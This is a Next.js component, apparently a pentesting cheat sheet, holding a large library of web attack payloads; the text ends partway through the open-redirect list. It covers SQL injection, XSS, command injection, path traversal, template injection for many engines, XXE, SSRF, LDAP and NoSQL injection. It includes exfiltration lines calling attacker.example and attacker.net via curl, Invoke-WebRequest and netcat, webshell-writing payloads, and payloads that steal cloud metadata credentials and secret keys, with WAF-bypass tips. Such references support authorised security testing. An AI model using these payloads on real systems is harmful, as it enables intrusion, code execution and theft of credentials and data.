'use client';

import React, { useMemo, useState } from 'react';
import { IBM_Plex_Sans, IBM_Plex_Mono } from 'next/font/google';
import {
    ShieldAlert, Search, X, Copy, Check, ChevronDown, ChevronRight,
    Database, Code2, Terminal, FolderTree, Braces, FileWarning, Globe,
    Network, Link2, KeyRound, ListFilter, Info,
} from 'lucide-react';

const sans = IBM_Plex_Sans({
    subsets: ['latin'],
    weight: ['400', '500', '600', '700'],
    display: 'swap',
});
const mono = IBM_Plex_Mono({
    subsets: ['latin'],
    weight: ['400', '500'],
    display: 'swap',
});

// ─── Data model ──────────────────────────────────────────────────────────────

interface PayloadItem {
    payload: string;
    lang?: string;       // shown in the editor's label bar, e.g. "sql", "bash", "python"
    note?: string;
    tags?: string[];
}
interface PayloadGroup {
    title: string;
    items: PayloadItem[];
}
interface PayloadCategory {
    id: string;
    name: string;
    icon: React.ReactNode;
    accent: string; // tailwind color stem, e.g. "emerald", "sky"
    blurb: string;
    groups: PayloadGroup[];
}

const CATEGORIES: PayloadCategory[] = [
    {
        id: 'sqli',
        name: 'SQL Injection',
        icon: <Database size={15} />,
        accent: 'emerald',
        blurb: 'Auth bypass, UNION, error-based and blind payloads across common engines.',
        groups: [
            {
                title: 'Authentication bypass',
                items: [
                    { payload: `' OR '1'='1`, lang: 'sql' },
                    { payload: `' OR '1'='1' --`, lang: 'sql', tags: ['mysql', 'mssql'] },
                    { payload: `' OR '1'='1' #`, lang: 'sql', tags: ['mysql'] },
                    { payload: `admin' --`, lang: 'sql', note: 'Comments out the rest of the query after the username check.' },
                    { payload: `admin' #`, lang: 'sql', tags: ['mysql'] },
                    { payload: `' OR 1=1 LIMIT 1 --`, lang: 'sql', tags: ['mysql', 'postgres'] },
                    { payload: `'='`, lang: 'sql', note: 'Works when the query already has a trailing quote to pair with.' },
                ],
            },
            {
                title: 'UNION-based',
                items: [
                    { payload: `' ORDER BY 1--`, lang: 'sql', note: 'Increment the number to find the column count.' },
                    { payload: `' UNION SELECT NULL--`, lang: 'sql', note: 'Add more NULLs to match the column count.' },
                    { payload: `' UNION SELECT NULL,NULL,NULL--`, lang: 'sql' },
                    { payload: `' UNION SELECT username, password FROM users--`, lang: 'sql' },
                    { payload: `' UNION SELECT table_name, NULL FROM information_schema.tables--`, lang: 'sql', tags: ['enumeration'] },
                    { payload: `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--`, lang: 'sql', tags: ['enumeration'] },
                ],
            },
            {
                title: 'Error-based',
                items: [
                    { payload: `' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--`, lang: 'sql', tags: ['mysql'] },
                    { payload: `' AND updatexml(1, concat(0x7e, (SELECT database())), 1)--`, lang: 'sql', tags: ['mysql'] },
                    { payload: `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`, lang: 'sql', tags: ['mysql'] },
                    { payload: `' AND 1=CONVERT(int,(SELECT @@version))--`, lang: 'sql', tags: ['mssql'] },
                    { payload: `' AND 1=CAST((SELECT version()) AS int)--`, lang: 'sql', tags: ['postgres'] },
                ],
            },
            {
                title: 'Boolean-based blind',
                items: [
                    { payload: `' AND 1=1--`, lang: 'sql', note: 'Baseline true condition — compare response against the false case.' },
                    { payload: `' AND 1=2--`, lang: 'sql' },
                    { payload: `' AND SUBSTRING((SELECT database()),1,1)='a'--`, lang: 'sql', note: 'Extract one character at a time via binary/char search.' },
                    { payload: `' AND (SELECT COUNT(*) FROM users)>0--`, lang: 'sql' },
                ],
            },
            {
                title: 'Time-based blind, by engine',
                items: [
                    { payload: `' AND SLEEP(5)--`, lang: 'sql', tags: ['mysql'] },
                    { payload: `'; SELECT pg_sleep(5)--`, lang: 'sql', tags: ['postgres'] },
                    { payload: `'; WAITFOR DELAY '0:0:5'--`, lang: 'sql', tags: ['mssql'] },
                    { payload: `' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--`, lang: 'sql', tags: ['oracle'] },
                    { payload: `' AND (SELECT COUNT(*) FROM sqlite_master) AND randomblob(100000000)--`, lang: 'sql', tags: ['sqlite'], note: 'SQLite has no SLEEP(); a heavy query is the usual substitute.' },
                ],
            },
        ],
    },
    {
        id: 'xss',
        name: 'Cross-Site Scripting',
        icon: <Code2 size={15} />,
        accent: 'amber',
        blurb: 'Reflected/stored markup, event-handler, filter-bypass and polyglot payloads.',
        groups: [
            {
                title: 'Basic',
                items: [
                    { payload: `<script>alert(1)</script>`, lang: 'html' },
                    { payload: `<script>alert(document.cookie)</script>`, lang: 'html' },
                    { payload: `<img src=x onerror=alert(1)>`, lang: 'html' },
                    { payload: `<svg onload=alert(1)>`, lang: 'html' },
                    { payload: `<iframe src="javascript:alert(1)">`, lang: 'html' },
                ],
            },
            {
                title: 'Event handlers (no <script> needed)',
                items: [
                    { payload: `<body onload=alert(1)>`, lang: 'html' },
                    { payload: `<input autofocus onfocus=alert(1)>`, lang: 'html' },
                    { payload: `<details open ontoggle=alert(1)>`, lang: 'html' },
                    { payload: `<select autofocus onfocus=alert(1)>`, lang: 'html' },
                    { payload: `<video><source onerror=alert(1)>`, lang: 'html' },
                ],
            },
            {
                title: 'Filter / WAF bypass',
                items: [
                    { payload: `<ScRiPt>alert(1)</sCrIpT>`, lang: 'html', note: 'Case-mangling bypasses naive case-sensitive filters.' },
                    { payload: '<img src=x onerror=alert`1`>', lang: 'html', note: 'Template literal avoids parentheses.' },
                    { payload: `<svg/onload=alert(1)>`, lang: 'html', note: 'Slash instead of whitespace before the attribute.' },
                    { payload: `javascript:alert(1)`, lang: 'text', tags: ['href', 'src'] },
                    { payload: `"><script>alert(1)</script>`, lang: 'html', note: 'Breaks out of a double-quoted attribute first.' },
                    { payload: `<img src=x onerror=&#97;lert(1)>`, lang: 'html', note: 'HTML entity-encoded function name.' },
                ],
            },
            {
                title: 'Polyglot',
                items: [
                    {
                        payload: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */onerror=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`,
                        lang: 'text',
                        note: 'Designed to fire regardless of the surrounding context (attribute, tag, URL, JS string).',
                    },
                ],
            },
        ],
    },
    {
        id: 'cmdi',
        name: 'Command Injection',
        icon: <Terminal size={15} />,
        accent: 'rose',
        blurb: 'OS command injection payloads by execution context — shell, Python, Node, PHP, Rust.',
        groups: [
            {
                title: 'Linux / Bash',
                items: [
                    { payload: `; whoami`, lang: 'bash' },
                    { payload: `&& whoami`, lang: 'bash' },
                    { payload: `| whoami`, lang: 'bash' },
                    { payload: '`whoami`', lang: 'bash', note: 'Backtick command substitution.' },
                    { payload: `$(whoami)`, lang: 'bash', note: 'POSIX command substitution — survives more filters than backticks.' },
                    { payload: `; cat /etc/passwd`, lang: 'bash' },
                    { payload: `; curl http://attacker.example/$(whoami)`, lang: 'bash', note: "Out-of-band exfiltration when output isn't reflected." },
                ],
            },
            {
                title: 'Windows / CMD',
                items: [
                    { payload: `& whoami`, lang: 'cmd' },
                    { payload: `&& whoami`, lang: 'cmd' },
                    { payload: `| whoami`, lang: 'cmd' },
                    { payload: `& dir`, lang: 'cmd' },
                    { payload: `& type C:\\Windows\\win.ini`, lang: 'cmd' },
                ],
            },
            {
                title: 'PowerShell',
                items: [
                    { payload: `; whoami`, lang: 'powershell' },
                    { payload: `| whoami`, lang: 'powershell' },
                    { payload: `; Get-Content C:\\Windows\\win.ini`, lang: 'powershell' },
                    { payload: `; Invoke-WebRequest -Uri http://attacker.example/$(whoami)`, lang: 'powershell', note: 'OOB exfiltration via Invoke-WebRequest.' },
                ],
            },
            {
                title: 'Python (os.system / eval / exec sinks)',
                items: [
                    { payload: `__import__('os').system('whoami')`, lang: 'python', note: 'For eval()/exec() sinks that evaluate user input as Python.' },
                    { payload: `'; import os; os.system('id') #`, lang: 'python', note: 'When input is concatenated into a Python source string.' },
                    { payload: `os.popen('whoami').read()`, lang: 'python', note: 'Use when you need the command output rather than just a side effect.' },
                ],
            },
            {
                title: 'Node.js (child_process)',
                items: [
                    { payload: `require('child_process').execSync('whoami').toString()`, lang: 'javascript' },
                    { payload: `); require('child_process').execSync('whoami'); //`, lang: 'javascript', note: 'For injection into a JS expression context.' },
                ],
            },
            {
                title: 'PHP',
                items: [
                    { payload: `; system('whoami');`, lang: 'php', note: 'When input reaches shell_exec/system/passthru/exec.' },
                    { payload: `; phpinfo();`, lang: 'php', tags: ['recon'] },
                ],
            },
            {
                title: 'Rust (std::process::Command)',
                items: [
                    {
                        payload: `; whoami`,
                        lang: 'bash',
                        note: 'Command::new() does NOT invoke a shell by default, so shell metacharacters only work when the app explicitly shells out, e.g. Command::new("sh").arg("-c").arg(input).',
                    },
                    {
                        payload: `$(whoami)`,
                        lang: 'bash',
                        note: "Same shell-invocation caveat as above — confirm the target actually wraps input in sh -c / cmd /c first.",
                    },
                ],
            },
        ],
    },
    {
        id: 'path',
        name: 'Path Traversal / LFI',
        icon: <FolderTree size={15} />,
        accent: 'sky',
        blurb: 'Directory traversal and local file inclusion, including encoding and filter bypasses.',
        groups: [
            {
                title: 'Basic traversal',
                items: [
                    { payload: `../../../../etc/passwd`, lang: 'text', tags: ['linux'] },
                    { payload: `..\\..\\..\\..\\windows\\win.ini`, lang: 'text', tags: ['windows'] },
                    { payload: `....//....//....//etc/passwd`, lang: 'text', note: 'Bypasses naive "../" string stripping.' },
                    { payload: `..%2f..%2f..%2fetc%2fpasswd`, lang: 'text', note: 'URL-encoded slashes.' },
                    { payload: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`, lang: 'text' },
                ],
            },
            {
                title: 'Null byte / extension bypass',
                items: [
                    { payload: `../../../../etc/passwd%00`, lang: 'text', note: 'Only affects legacy PHP (<5.3.4) and similar older stacks.' },
                    { payload: `../../../../etc/passwd%00.jpg`, lang: 'text' },
                ],
            },
            {
                title: 'PHP wrappers (LFI to RCE)',
                items: [
                    { payload: `php://filter/convert.base64-encode/resource=index.php`, lang: 'text', note: 'Read source without execution.' },
                    { payload: `php://filter/read=convert.base64-encode/resource=../config.php`, lang: 'text' },
                    { payload: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==`, lang: 'text', note: 'data:// wrapper carrying a base64-encoded PHP webshell, where allow_url_include is on.' },
                ],
            },
        ],
    },
    {
        id: 'ssti',
        name: 'Server-Side Template Injection',
        icon: <Braces size={15} />,
        accent: 'violet',
        blurb: 'Detection polyglots and RCE payloads for every major template engine, by language.',
        groups: [
            {
                title: 'Universal detection',
                items: [
                    {
                        payload: `\${{<%[%'"}}%\\.`,
                        lang: 'text',
                        note: 'Polyglot that triggers a parse error in almost any template engine — a fast first probe before you know what\'s running.',
                    },
                    { payload: `{{7*7}}`, lang: 'text', tags: ['jinja2', 'twig', 'pebble'] },
                    { payload: `\${7*7}`, lang: 'text', tags: ['freemarker', 'velocity', 'spel'] },
                    { payload: `#{7*7}`, lang: 'text', tags: ['thymeleaf', 'slim', 'haml'] },
                    { payload: `*{7*7}`, lang: 'text', tags: ['thymeleaf', 'spel'] },
                    { payload: `<%= 7*7 %>`, lang: 'text', tags: ['erb', 'erubi', 'erubis'] },
                    {
                        payload: `(1/0).zxy.zxy`,
                        lang: 'text',
                        note: 'Error-based probe — the resulting stack trace often names the language: ZeroDivisionError (Python), java.lang.ArithmeticException (Java), ReferenceError/TypeError (Node), Division by zero / DivisionByZeroError (PHP), divided by 0 (Ruby).',
                    },
                ],
            },

            // ───────────────────────── PHP ─────────────────────────
            {
                title: 'PHP — universal (Blade, Latte, Smarty)',
                items: [
                    { payload: `shell_exec('id')`, lang: 'php', note: 'Rendered RCE — wrap in the engine\'s tag, e.g. {{ }} for Blade.' },
                    { payload: `system('id')`, lang: 'php' },
                    { payload: `1 / (pclose(popen("id", "wb")) == 0)`, lang: 'php', note: 'Boolean-based RCE for blind detection.' },
                    { payload: `shell_exec('id && sleep 5')`, lang: 'php', note: 'Time-based RCE.' },
                ],
            },
            {
                title: 'PHP — Twig',
                items: [
                    { payload: `{{dump(app)}}`, lang: 'twig' },
                    { payload: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`, lang: 'twig' },
                    { payload: `{{['id']|filter('system')}}`, lang: 'twig' },
                    { payload: `{{['id']|map('passthru')}}`, lang: 'twig' },
                    { payload: `{{self.env.setCache("ftp://attacker.net:2121")}}{{self.env.loadTemplate("backdoor")}}`, lang: 'twig', note: 'Cache-poisoning escalation path.' },
                    { payload: `"{{'/etc/passwd'|file_excerpt(1,30)}}"@`, lang: 'twig', tags: ['arbitrary-file-read'] },
                ],
            },
            {
                title: 'PHP — Smarty',
                items: [
                    { payload: `{\$smarty.version}`, lang: 'text', note: 'Version fingerprint.' },
                    { payload: `{php}echo \`id\`;{/php}`, lang: 'php', tags: ['deprecated-v3'] },
                    { payload: `{system('id')}`, lang: 'text', tags: ['v3-only'] },
                    {
                        payload: `{Smarty_Internal_Write_File::writeFile(\$SCRIPT_NAME,"<?php passthru(\$_GET['cmd']); ?>",self::clearConfig())}`,
                        lang: 'text',
                        note: 'Writes a persistent PHP webshell to the running script path.',
                    },
                ],
            },
            {
                title: 'PHP — Blade (Laravel)',
                items: [
                    {
                        payload: `{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}`,
                        lang: 'php',
                        note: "Obfuscated — builds the string 'chr' then the command 'id' character-by-character to dodge keyword filters.",
                    },
                ],
            },
            {
                title: 'PHP — Latte',
                items: [
                    { payload: `{var \$X="POC"}{\$X}`, lang: 'text', note: 'Basic variable injection probe.' },
                    { payload: `{php system('nslookup oastify.com')}`, lang: 'php', tags: ['oob', 'blind'] },
                ],
            },

            // ──────────────────────── Python ────────────────────────
            {
                title: 'Python — universal (Bottle, Chameleon, Cheetah, Mako, Tornado)',
                items: [
                    { payload: `__include__("os").popen("id").read()`, lang: 'python', note: 'Rendered RCE.' },
                    { payload: `1 / (__include__("os").popen("id")._proc.wait() == 0)`, lang: 'python', note: 'Boolean-based RCE.' },
                    { payload: `__include__("os").popen("id && sleep 5").read()`, lang: 'python', note: 'Time-based RCE.' },
                ],
            },
            {
                title: 'Python — Jinja2 (Flask/Django)',
                items: [
                    { payload: `{{config.items()}}`, lang: 'jinja2', note: 'Dumps the Flask app config if exposed.' },
                    { payload: `{{''.__class__.__mro__[2].__subclasses__()}}`, lang: 'jinja2', note: 'Walks the class hierarchy — find an index that gives you subprocess.Popen or file I/O.' },
                    {
                        payload: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`,
                        lang: 'jinja2',
                        note: 'Classic full-path payload through __builtins__.',
                    },
                    {
                        payload: `{{ lipsum.__globals__["os"].popen('id').read() }}`,
                        lang: 'jinja2',
                        note: 'Shortest known Jinja2 RCE — uses the built-in lipsum global instead of walking subclasses.',
                    },
                    {
                        payload: `{{ cycler.__init__.__globals__.os.popen('id').read() }}`,
                        lang: 'jinja2',
                        note: "Works even when __builtins__ is filtered, since cycler is a context-free built-in.",
                    },
                    {
                        payload: `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}`,
                        lang: 'jinja2',
                        note: 'Arbitrary file read — the subclass index (40 here) varies per Python version/app, so brute the index if it fails.',
                    },
                    {
                        payload: `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}`,
                        lang: 'jinja2',
                        note: 'Finds the exploitable subclass automatically instead of guessing an index — pair with a ?input= query param for the command.',
                    },
                    {
                        payload: `{{request|attr(["__","class","__"]|join)}}`,
                        lang: 'jinja2',
                        tags: ['filter-bypass'],
                        note: 'Bypasses a blacklist on literal underscores by building "__class__" via string ops.',
                    },
                ],
            },
            {
                title: 'Python — Django Templates',
                items: [
                    { payload: `{{ 7*7 }}`, lang: 'text', note: 'Errors under Django Templates (DT) — DT has no function calls, so impact is lower than Jinja2.' },
                    { payload: `{% debug %}`, lang: 'text', tags: ['info-leak'] },
                    { payload: `{{ messages.storages.0.signer.key }}`, lang: 'text', note: "Leaks the app's SECRET_KEY." },
                    {
                        payload: `{% load log %}{% get_admin_log 10 as log %}{% for e in log %}{{e.user.get_username}} : {{e.user.password}}{% endfor %}`,
                        lang: 'text',
                        note: 'Leaks admin usernames and password hashes via the admin log tag.',
                    },
                ],
            },
            {
                title: 'Python — Mako',
                items: [
                    {
                        payload: `<%\nimport os\nx=os.popen('id').read()\n%>\n\${x}`,
                        lang: 'python',
                        note: 'Mako is effectively embedded Python, so this is just a Python code block.',
                    },
                    {
                        payload: `\${self.module.cache.util.os.system("id")}`,
                        lang: 'text',
                        note: 'Reaches the os module through an internal attribute chain — many equivalent chains exist (self.template.module.*, self.attr._NSAttr__parent.*, etc.) if one path is blocked.',
                    },
                ],
            },
            {
                title: 'Python — Tornado',
                items: [
                    { payload: `{{os.system('whoami')}}`, lang: 'python' },
                    { payload: `{%import os%}{{os.system('nslookup oastify.com')}}`, lang: 'python', tags: ['oob'] },
                ],
            },

            // ───────────────────────── Java ─────────────────────────
            {
                title: 'Java EL (generic)',
                items: [
                    { payload: `\${7*7}`, lang: 'text' },
                    {
                        payload: `\${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()}`,
                        lang: 'text',
                        note: 'Core Runtime.exec() pattern reused across Freemarker, SpEL, Velocity, OGNL with different wrapper syntax.',
                    },
                ],
            },
            {
                title: 'Java — Freemarker',
                items: [
                    {
                        payload: `<#assign ex="freemarker.template.utility.Execute"?new()>\${ ex("id")}`,
                        lang: 'ftl',
                        note: 'The canonical Freemarker RCE via the built-in Execute utility class.',
                    },
                    { payload: `\${"freemarker.template.utility.Execute"?new()("id && sleep 5")}`, lang: 'ftl', note: 'Time-based variant.' },
                    {
                        payload: `\${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('../../etc/passwd').toURL().openStream().readAllBytes()?join(" ")}`,
                        lang: 'ftl',
                        tags: ['file-read'],
                    },
                ],
            },
            {
                title: 'Java — Velocity',
                items: [
                    {
                        payload: `#set($str=$class.inspect("java.lang.String").type)\n#set($chr=$class.inspect("java.lang.Character").type)\n#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))\n$ex.waitFor()`,
                        lang: 'vtl',
                        note: 'Executes whoami and waits for completion before reading output.',
                    },
                    {
                        payload: `#set($s="")\n#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))\n#set($n=$p.waitFor())\n#set($r=$p.exitValue())\n#if($r != 0)\n#set($t=$s.getClass().forName("java.lang.Thread").sleep(5000))\n#end`,
                        lang: 'vtl',
                        note: 'Time-based blind variant for when output isn\'t reflected.',
                    },
                ],
            },
            {
                title: 'Java — Groovy',
                items: [
                    { payload: `\${9*9}`, lang: 'text' },
                    { payload: `\${"calc.exe".execute()}`, lang: 'groovy' },
                    { payload: `\${new File('/etc/passwd').getText('UTF-8')}`, lang: 'groovy', tags: ['file-read'] },
                    {
                        payload: `\${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")}) def x }`,
                        lang: 'groovy',
                        tags: ['sandbox-bypass'],
                    },
                ],
            },
            {
                title: 'Java — Spring Expression Language (SpEL)',
                items: [
                    { payload: `\${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}`, lang: 'text' },
                    { payload: `\${T(java.lang.System).getenv()}`, lang: 'text', tags: ['env-leak'] },
                    {
                        payload: `#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}#{session.getAttribute("rtc").setAccessible(true)}#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}`,
                        lang: 'text',
                        note: "Reflection-based path that avoids calling T(java.lang.Runtime) directly, useful if that's blacklisted.",
                    },
                ],
            },
            {
                title: 'Java — OGNL',
                items: [
                    { payload: `7*7`, lang: 'text' },
                    { payload: `new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes())`, lang: 'text' },
                    { payload: `1/((@java.lang.Runtime@getRuntime().exec("id").waitFor()==0)?1:0)+""`, lang: 'text', note: 'Boolean-based variant.' },
                ],
            },
            {
                title: 'Java — Jinjava (HubSpot)',
                items: [
                    {
                        payload: `{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\\"whoami\\"); x.start()")}}`,
                        lang: 'text',
                        note: 'Pivots through the JVM\'s built-in JavaScript engine to reach ProcessBuilder — patched in current Jinjava.',
                    },
                ],
            },
            {
                title: 'Java — Pebble',
                items: [
                    {
                        payload: `{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}`,
                        lang: 'text',
                        note: 'Current Pebble payload — older versions (<3.0.9) allow direct .getClass().forName(...).exec() instead.',
                    },
                ],
            },

            // ───────────────────────── Ruby ─────────────────────────
            {
                title: 'Ruby — universal (ERB, Erubi, Erubis, HAML, Slim)',
                items: [
                    { payload: `%x('id')`, lang: 'ruby', note: 'Rendered RCE via backtick-equivalent shell execution.' },
                    { payload: `1/(system("id")&&1||0)`, lang: 'ruby', note: 'Boolean-based RCE.' },
                    { payload: `system("id && sleep 5")`, lang: 'ruby', note: 'Time-based RCE.' },
                ],
            },
            {
                title: 'Ruby — ERB / Erubi / Erubis',
                items: [
                    { payload: `<%= 7 * 7 %>`, lang: 'erb' },
                    { payload: `<%= File.open('/etc/passwd').read %>`, lang: 'erb', tags: ['file-read'] },
                    { payload: `<%= \`ls /\` %>`, lang: 'erb' },
                    { payload: `<%= system('cat /etc/passwd') %>`, lang: 'erb' },
                    {
                        payload: `<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>`,
                        lang: 'erb',
                        note: 'Alternate exec path via Open3 when backticks/system are filtered.',
                    },
                ],
            },
            {
                title: 'Ruby — Slim',
                items: [
                    { payload: `#{ 7 * 7 }`, lang: 'text' },
                    { payload: `#{ %x|env| }`, lang: 'text', tags: ['env-leak'] },
                ],
            },

            // ──────────────────────── Node.js ───────────────────────
            {
                title: 'Node.js — universal (DotJS, EJS, PugJS, UnderscoreJS, Eta)',
                items: [
                    {
                        payload: `global.process.mainModule.require("child_process").execSync("id").toString()`,
                        lang: 'javascript',
                        note: 'Rendered RCE — the global.process.mainModule path works even in sandboxed contexts where require() alone is blocked.',
                    },
                    {
                        payload: `[""][0 + !(global.process.mainModule.require("child_process").spawnSync("id", options={shell:true}).status===0)]["length"]`,
                        lang: 'javascript',
                        note: 'Boolean-based blind variant.',
                    },
                    {
                        payload: `global.process.mainModule.require("child_process").execSync("id && sleep 5").toString()`,
                        lang: 'javascript',
                        note: 'Time-based blind variant.',
                    },
                    {
                        payload: `{{range.constructor(' ... ')()}}`,
                        lang: 'text',
                        tags: ['nunjucks'],
                        note: 'Nunjucks-specific — constructs and immediately invokes a Function from the range global.',
                    },
                ],
            },
            {
                title: 'Node.js — Handlebars',
                items: [
                    { payload: `{{this}}`, lang: 'text', note: 'Basic context-dump probe.' },
                    {
                        payload: `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('ls -la');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}`,
                        lang: 'text',
                        note: 'Only works on Handlebars < 4.1.2/4.0.14/3.0.7 — fixed in GHSA-q42p-pg8m-cqh6. Builds a Function via split/pop/push gymnastics to dodge the sandbox.',
                    },
                ],
            },
            {
                title: 'Node.js — Lodash templates',
                items: [
                    { payload: `{{= _.VERSION}}`, lang: 'text', note: 'Version/delimiter probe — actual delimiter depends on how the app configured options.evaluate.' },
                    {
                        payload: `{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}`,
                        lang: 'javascript',
                        note: 'Builds a raw spawn_sync call from primitives — needed because lodash templates don\'t expose require() directly.',
                    },
                ],
            },
            {
                title: 'Node.js — Pug',
                items: [
                    {
                        payload: `- var x = root.process\n- x = x.mainModule.require\n- x = x('child_process')\n= x.exec('id | nc attacker.net 80')`,
                        lang: 'text',
                        tags: ['oob'],
                        note: 'Builds the require chain across multiple statements, then exfiltrates via netcat since Pug code blocks don\'t return output directly.',
                    },
                    {
                        payload: `#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}`,
                        lang: 'text',
                        tags: ['file-read'],
                    },
                ],
            },
        ],
    },
    {
        id: 'xxe',
        name: 'XML External Entity (XXE)',
        icon: <FileWarning size={15} />,
        accent: 'orange',
        blurb: 'Local file read, SSRF and blind/OOB XXE via malicious DTDs.',
        groups: [
            {
                title: 'Classic file read',
                items: [
                    {
                        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
                        lang: 'xml',
                    },
                    {
                        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,
                        lang: 'xml',
                        tags: ['windows'],
                    },
                ],
            },
            {
                title: 'SSRF via XXE',
                items: [
                    { payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`, lang: 'xml', tags: ['cloud-metadata'] },
                ],
            },
            {
                title: 'Blind / out-of-band (external DTD)',
                items: [
                    {
                        payload: `<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.example/evil.dtd"><foo>&exfil;</foo>`,
                        lang: 'xml',
                        note: 'evil.dtd on your server defines the entity and sends its contents back to you.',
                    },
                ],
            },
        ],
    },
    {
        id: 'ssrf',
        name: 'Server-Side Request Forgery',
        icon: <Globe size={15} />,
        accent: 'cyan',
        blurb: 'Internal network, cloud metadata and filter-bypass payloads for SSRF sinks.',
        groups: [
            {
                title: 'Internal network probing',
                items: [
                    { payload: `http://127.0.0.1:80`, lang: 'text' },
                    { payload: `http://localhost:22`, lang: 'text' },
                    { payload: `http://0.0.0.0:80`, lang: 'text' },
                    { payload: `http://[::1]:80`, lang: 'text', note: 'IPv6 loopback — bypasses filters that only check "127.0.0.1".' },
                ],
            },
            {
                title: 'Cloud metadata endpoints',
                items: [
                    { payload: `http://169.254.169.254/latest/meta-data/`, lang: 'text', tags: ['aws'] },
                    { payload: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, lang: 'text', tags: ['aws'] },
                    { payload: `http://metadata.google.internal/computeMetadata/v1/`, lang: 'text', tags: ['gcp'], note: 'Requires the Metadata-Flavor: Google header on GCP.' },
                    { payload: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`, lang: 'text', tags: ['azure'] },
                ],
            },
            {
                title: 'Filter bypass',
                items: [
                    { payload: `http://127.1`, lang: 'text', note: 'Shortened loopback form.' },
                    { payload: `http://0177.0.0.1`, lang: 'text', note: 'Octal IP encoding.' },
                    { payload: `http://2130706433`, lang: 'text', note: 'Decimal IP encoding of 127.0.0.1.' },
                    { payload: `http://attacker.example@127.0.0.1`, lang: 'text', note: 'Userinfo trick against naive hostname allow-lists.' },
                ],
            },
        ],
    },
    {
        id: 'ldap',
        name: 'LDAP Injection',
        icon: <Network size={15} />,
        accent: 'fuchsia',
        blurb: 'Filter manipulation for LDAP search/auth queries.',
        groups: [
            {
                title: 'Authentication bypass',
                items: [
                    { payload: `*)(uid=*))(|(uid=*`, lang: 'text' },
                    { payload: `admin)(&)`, lang: 'text', note: 'Null-byte-style filter closing trick.' },
                    { payload: `*)(|(password=*))`, lang: 'text' },
                    { payload: `*)(objectClass=*`, lang: 'text' },
                ],
            },
        ],
    },
    {
        id: 'nosql',
        name: 'NoSQL Injection',
        icon: <Database size={15} />,
        accent: 'lime',
        blurb: 'MongoDB-style operator injection for JSON-based query sinks.',
        groups: [
            {
                title: 'Authentication bypass (MongoDB)',
                items: [
                    { payload: `{"$ne": null}`, lang: 'json', note: 'Submit as the password field value to match any non-null password.' },
                    { payload: `{"$gt": ""}`, lang: 'json' },
                    { payload: `admin' || '1'=='1`, lang: 'text', tags: ['string-context'] },
                    { payload: `{"username": {"$ne": null}, "password": {"$ne": null}}`, lang: 'json' },
                ],
            },
            {
                title: 'Blind extraction via $regex',
                items: [
                    { payload: `{"password": {"$regex": "^a"}}`, lang: 'json', note: 'Walk character-by-character to extract an unknown value.' },
                ],
            },
        ],
    },
    {
        id: 'redirect',
        name: 'Open Redirect',
        icon: <Link2 size={15} />,
        accent: 'teal',
        blurb: 'Bypasses for redirect-target allow-lists and "starts with /" checks.',
        groups: [
            {
                title: 'Common bypasses',
                items: [
                    { payload: `//evil.example`, lang: 'text', note: 'Protocol-relative URL — many checks only look for "http".' },
                    { payload: `/\\evil.example`, lang: 'text', note: 'Backslash is treated as a slash by some browsers.' },
                    { payload: `https:evil.example`, lang: 'text', note: 'Missing "//" still parses as absolute in some parsers.' },
                    { payload: `/%09/evil.example`, lang: 'text', note: 'Tab character between slashes confuses naive path checks.' },
